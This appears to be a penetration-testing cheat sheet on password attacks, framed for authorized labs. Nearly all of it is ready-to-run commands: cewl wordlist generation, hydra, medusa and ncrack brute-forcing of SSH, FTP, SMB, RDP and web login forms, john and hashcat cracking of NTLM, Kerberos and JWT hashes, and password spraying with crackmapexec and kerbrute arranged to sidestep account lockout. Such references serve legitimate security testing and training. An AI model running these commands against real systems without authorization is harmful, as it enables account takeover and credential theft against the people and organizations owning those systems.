# Password Attacks

Password attack commands for authorized labs. Prefer scoped, low-rate validation when account lockout could matter.

## Wordlist Generation

```bash
cewl http://target/ -w words.txt
cewl http://target/ --with-numbers -w words-numbers.txt
```

## Hydra

```bash
hydra -L users.txt -P passwords.txt ssh://target
hydra -l user -P rockyou.txt ftp://target
hydra -L users.txt -p 'Password123!' smb://target
hydra -L users.txt -P passwords.txt http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid"
```

## Medusa

```bash
medusa -h target -U users.txt -P passwords.txt -M ssh
medusa -h target -u user -P passwords.txt -M ftp
```

## Ncrack

```bash
ncrack -U users.txt -P passwords.txt ssh://target
ncrack -u user -P passwords.txt rdp://target
```

## John

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --show hash.txt
ssh2john id_rsa > ssh.hash
zip2john file.zip > zip.hash
rar2john file.rar > rar.hash
```

## Hashcat

```bash
hashcat -m 0 hashes.txt rockyou.txt
hashcat -m 1000 ntlm.txt rockyou.txt
hashcat -m 13100 kerberoast.txt rockyou.txt
hashcat -m 18200 asrep.txt rockyou.txt
hashcat -m 16500 jwt.txt rockyou.txt
```

Common modes:

- `0` MD5
- `1000` NTLM
- `13100` Kerberos TGS
- `18200` Kerberos AS-REP
- `16500` JWT HMAC

## Password Spraying

Use one password across many users before trying many passwords against one user.

```bash
crackmapexec smb target -u users.txt -p 'Password123!' --continue-on-success
kerbrute passwordspray -d domain.local users.txt 'Password123!'
```

## Related

- [Kerberoasting Cheat Sheet](Kerberoasting%20Cheat%20Sheet.md)
- [Pass-the-Hash Cheat Sheet](Pass-the-Hash%20Cheat%20Sheet.md)
